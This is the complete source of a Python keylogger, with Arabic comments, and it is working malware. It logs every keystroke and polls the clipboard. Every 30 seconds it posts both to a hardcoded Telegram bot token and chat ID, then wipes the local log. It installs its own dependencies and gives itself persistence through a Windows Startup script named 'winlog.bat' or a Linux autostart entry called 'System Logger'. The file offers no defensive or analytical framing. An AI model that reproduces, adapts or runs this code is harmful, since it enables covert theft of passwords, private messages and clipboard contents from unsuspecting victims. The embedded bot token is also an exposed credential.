import os
import sys
import time
import threading
import logging
import requests
import subprocess
import platform
from pynput import keyboard

BOT_TOKEN = "8080874778:AAFOF6xv63VJGpRCDCGRdHfW65D8yOmAbSQ"  # 🔴 هذا توكن بوت تليجرام
CHAT_ID = "7426993484"  # 🔴 هذا معرف الشات الذي تُرسل إليه البيانات
LOG_FILE = os.path.expanduser("~/.keylogs.txt")

def install_dependencies():
    try:
        import pynput
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "pynput", "requests"], check=True)
    import pynput

install_dependencies()

logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def send_logs():
    while True:
        time.sleep(30)  # ⏱️ إرسال كل 30 ثانية
        if os.path.exists(LOG_FILE):
            with open(LOG_FILE, "r") as file:
                logs = file.read()
            if logs.strip():
                # 🔴 هنا يتم الإرسال إلى تليجرام
                requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                              data={"chat_id": CHAT_ID, "text": logs})
                open(LOG_FILE, "w").close()  # 🧼 مسح الملف بعد الإرسال

def capture_clipboard():
    try:
        import pyperclip
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", "pyperclip"], check=True)
    import pyperclip

    while True:
        time.sleep(30)
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            # 🔴 إرسال محتوى الحافظة إلى تليجرام
            requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                          data={"chat_id": CHAT_ID, "text": f"Clipboard: {clipboard_content}"})

def add_to_startup():
    if platform.system() == "Windows":
        startup_script = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup", "winlog.bat")
        with open(startup_script, "w") as file:
            file.write(f"@echo off\npython {sys.argv[0]}\n")
    elif platform.system() == "Linux":
        autostart_file = os.path.expanduser("~/.config/autostart/keylogger.desktop")
        os.makedirs(os.path.dirname(autostart_file), exist_ok=True)
        with open(autostart_file, "w") as file:
            file.write(f"[Desktop Entry]\nType=Application\nExec=python3 {sys.argv[0]}\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName=System Logger\n")

if __name__ == "__main__":
    add_to_startup()
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=capture_clipboard, daemon=True).start()
    send_logs()
